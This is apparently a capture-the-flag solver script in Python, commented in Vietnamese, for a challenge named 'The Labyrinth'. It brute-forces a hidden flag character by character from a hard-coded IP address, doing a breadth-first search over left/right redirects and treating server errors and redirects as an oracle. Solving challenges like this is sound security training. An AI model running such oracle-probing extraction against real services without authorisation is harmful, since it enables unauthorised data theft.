import requests
import math
import sys
import time

TARGET_URL = "http://34.186.135.240:31337"
CHARSET = "0123456789?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_abcdefghijklmnopqrstuvwxyz{|}"

def decode_bits_to_char(bit_path):
    """ Bước 4 Write-up: Decode bits to char bằng Toán học """
    current_chars = CHARSET
    for bit in bit_path:
        mid = math.ceil(len(current_chars) / 2)
        if bit == '0':
            current_chars = current_chars[:mid]
        elif bit == '1':
            current_chars = current_chars[mid:]
    return current_chars[0]

def find_bit_path(index):
    """ Thuật toán BFS theo dấu vết chuyển hướng của Server """
    # Queue lưu trữ: (chuỗi_bit, cookie_hiện_tại)
    queue = [("", None)]
    
    while queue:
        curr_path, cookies = queue.pop(0)
        
        # Hiệu ứng loading để theo dõi tốc độ thuật toán
        print(f"   [~] Đang quét path: {curr_path:<10}", end="\r")
        
        for next_bit in ['0', '1']:
            test_path = curr_path + next_bit
            step = 'left' if next_bit == '0' else 'right'
            
            # TẠO SESSION MỚI ĐỂ KHÔNG BỊ TRÀN COOKIE
            session = requests.Session()
            session.headers.update({'User-Agent': 'Mozilla/5.0'})
            
            # Khởi tạo trạng thái hoặc nạp Cookie của bước trước
            if cookies is None:
                try:
                    session.get(f"{TARGET_URL}/flag/{index}", timeout=5)
                except requests.exceptions.RequestException:
                    pass
            else:
                session.cookies.update(cookies)
                
            # Gửi hành động và cho phép TỰ ĐỘNG CHUYỂN HƯỚNG để nhận phán quyết
            try:
                r = session.get(f"{TARGET_URL}/flag/{index}/{step}", allow_redirects=True, timeout=5)
            except requests.exceptions.RequestException:
                time.sleep(1) # Nếu server lag, đợi 1s
                try:
                    r = session.get(f"{TARGET_URL}/flag/{index}/{step}", allow_redirects=True, timeout=5)
                except:
                    continue
            
            status = r.status_code
            final_url = r.url.rstrip('/')
            
            if status == 500:
                # Cookie bị vi phạm quy tắc Class (L/R) -> Nhánh bị Server chém (Pruned)
                continue
                
            elif final_url.endswith(f"/flag/{index + 1}"):
                # BINGO! Server thông báo đã qua cửa -> Đường đi này là đáp án!
                print(f"   [+] Đã chốt path hợp lệ: {test_path:<10}")
                return test_path
                
            elif final_url.endswith(f"/flag/{index}") and status == 200:
                # Đường đi hợp lệ nhưng chưa đủ độ sâu (chưa tới đáy chữ cái) -> Cho vào Queue
                queue.append((test_path, session.cookies.get_dict()))

    return None

def solve():
    print("[*] KHỞI ĐỘNG TOOL: THE LABYRINTH\n" + "="*50)
    flag = ""
    
    # Flag dài 32 ký tự theo Write-up
    for index in range(32):
        print(f"[*] Đang bẻ khóa ký tự thứ {index}...")
        
        bit_string = find_bit_path(index)
        
        if not bit_string:
            print(f"[-] Không tìm thấy đường đi! Có thể Server quá tải hoặc mất mạng.")
            break
            
        char = decode_bits_to_char(bit_string)
        flag += char
        
        print(f"[🔥] Ký tự {index} -> '{char}' | Flag: {flag}\n")
        
        if char == '}':
            break

    print(f"\n[🎉] CHÚC MỪNG! FLAG HOÀN CHỈNH: {flag}")

if __name__ == "__main__":
    solve()